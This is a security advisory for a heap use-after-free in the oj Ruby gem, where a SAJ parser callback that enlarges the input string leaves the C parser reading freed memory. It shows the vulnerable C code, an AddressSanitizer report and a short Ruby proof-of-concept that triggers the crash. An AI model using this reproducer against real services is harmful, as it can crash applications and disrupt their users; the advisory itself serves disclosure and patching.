# [H] Oj: Use-After-Free in Oj::Parser SAJ Callback via Input Mutation

## Summary
Severity: High
Advisory: GHSA-q2gm-54r6-8fwm
CVE: CVE-2026-54898
CWE: CWE-416
Ecosystem: RubyGems
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-q2gm-54r6-8fwm
Type: github-advisory

## Affected
- RubyGems: `oj` — affected >=0 <3.17.3

## Details
### Summary

`Oj::Parser#parse` is vulnerable to a heap use-after-free when a SAJ/SAJ2 callback mutates the input JSON string during parsing. The C engine holds a raw `const byte *` pointer into the Ruby string's internal buffer. If a callback (e.g. `hash_start`) resizes the string — for example by calling `String#replace` with a longer value — Ruby reallocates the string buffer and frees the old one. The C parser's pointer is left dangling; the next character read at `parser.c:607` is a use-after-free.

### Version

- **Software**: oj gem
- **Affected**: all versions with `ext/oj/parser.c`
- **Latest tested**: 3.17.1 (confirmed present)

### Details

`ext/oj/parser.c`, `parser_parse` → `parse`:

```c
static VALUE parser_parse(VALUE self, VALUE json) {
    const byte *ptr = (const byte *)StringValuePtr(json);  // raw pointer into Ruby string
    // ...
    parse(p, ptr);   // ptr used throughout; any realloc frees the backing buffer
}
```

```c
// parser.c:607
static void parse(ojParser p, const byte *json) {
    const byte *b = json;
    // ...
    for (; '\0' != *b; b++) {   // ← UAF: reads freed memory after callback resizes json
```

Ruby's `String#replace` (or `<<`, `gsub!`, etc.) can trigger a reallocation of the string's internal buffer if the new content is larger than the embedded capacity, freeing the old buffer that `ptr` still points to.

ASAN report:
```
==372273==ERROR: AddressSanitizer: heap-use-after-free on address 0x51900008ed81
READ of size 1 at 0x51900008ed81 thread T0
    #0 parse          /ext/oj/parser.c:607
    #1 parser_parse   /ext/oj/parser.c:1408
0x51900008ed81 is located 1 bytes inside of 1023-byte region [0x51900008ed80, 0x51900008f17f)
freed by thread T0 here:
    #0 free
    #1 ruby_sized_xfree  (libruby-3.3.so.3.3)
Shadow bytes: [fd]fd fd fd fd fd ...  (entire region freed)
```

### Reproduce

```ruby
require 'oj'

class Mutator
  def initialize(json) = (@json = json; @done = false)

  def hash_start(key)
    return if @done; @done = true
    @json.replace('x' * 1_000_000)   # triggers String realloc, frees original buffer
  end

  def hash_end(key); end
  def array_start(key); end
  def array_end(key); end
  def add_value(value, key); end
end

json = '{"a":1,"pad":"' + ('A' * 1000) + '","z":2}'
parser = Oj::Parser.new(:saj)
parser.handler = Mutator.new(json)
parser.parse(json)
```

## References
- https://github.com/ohler55/oj/security/advisories/GHSA-q2gm-54r6-8fwm
- https://github.com/ohler55/oj
